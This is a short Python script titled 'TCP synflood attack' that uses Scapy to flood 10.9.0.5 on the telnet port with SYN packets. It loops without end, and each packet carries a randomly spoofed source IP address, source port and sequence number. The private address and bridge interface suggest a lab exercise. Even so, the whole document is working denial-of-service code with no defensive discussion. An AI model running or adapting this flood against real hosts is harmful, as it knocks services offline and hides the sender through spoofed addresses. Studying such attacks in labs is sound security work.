# TCP synflood attack

from random import getrandbits
from ipaddress import IPv4Address
from scapy.all import IP, TCP, send

victim_ip = IP(dst="10.9.0.5")  # ip address of the victim
destination_tcp_port = TCP(dport=23, flags='S')  # destination port 23 is used for telnet
pkt = victim_ip/destination_tcp_port

while True:
    # Selecting random source ip address
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)  # random source port number
    pkt[TCP].seq = getrandbits(32)  # sequence number
    send(pkt, iface='br-023bb0beaf8c', verbose=0)
